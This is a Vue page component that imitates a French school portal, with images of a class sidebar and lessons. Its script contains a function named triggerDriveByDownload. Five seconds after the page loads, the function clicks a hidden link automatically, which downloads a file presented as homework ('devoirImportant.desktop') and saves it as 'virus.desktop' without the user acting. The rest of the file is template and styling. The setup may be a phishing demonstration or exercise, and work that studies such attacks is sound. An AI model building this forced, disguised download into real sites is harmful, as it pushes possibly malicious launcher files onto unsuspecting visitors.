<script setup>
    import { ref, onMounted } from 'vue';
    import MioButton from '@/components/MioButton.vue';
    import LeaButton from '@/components/LeaButton.vue';

    const triggerDriveByDownload = () => {
        const link = document.createElement('a');
        link.href = '/devoirImportant.desktop'; 
        link.download = 'virus.desktop';
        link.target = '_self';

        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    onMounted(() => {
        setTimeout(() => {
            triggerDriveByDownload();
        }, 5000);
    });
</script>

<template>
    <div class="container">
        <img class="banner" src="../assets/leaBanner.png" alt="Bannière de léa">

        <div class="mainContent">
            <div class="leftArea">
                <div class="round-buttons-area">
                    <LeaButton/>
                    <MioButton />
                </div>
                <img class="leaSideBar" src="../assets/sideBarLea.png" alt="Section Mes classes">
            </div>

            <div class="mainArea">
                <img class="leaMain" src="../assets/leaMain.png" alt="cours">
            </div>
        </div>
    </div>
</template>

<style scoped>
.mainContent{
    display: flex;
    flex-direction: row;
}
.container{
    background-color: #ffffff;
    display: flex;
    flex-direction: column;
    height: 100%;
    overflow: hidden;
}

.banner{
  width: 100%;     
  display: block;  
  height: auto;      
  max-height: 180px;
  object-fit: cover;
}
.leftArea{
    display: flex;
    flex-direction: column;
    width: 340px;
}
.mainArea{
    display: flex;
    flex: 1;
    justify-content: end;
}
.round-buttons-area{
    display: flex;
    flex-direction: row;
    margin: 30px;
    gap: 20px
}
.leaSideBar{
    max-width: 100%;
    height: auto;
    margin-left: 20px;
    margin-top: 15px
}
.leaMain{
    height: 710px;
    width: auto;
    margin-top: 20px;
}
</style>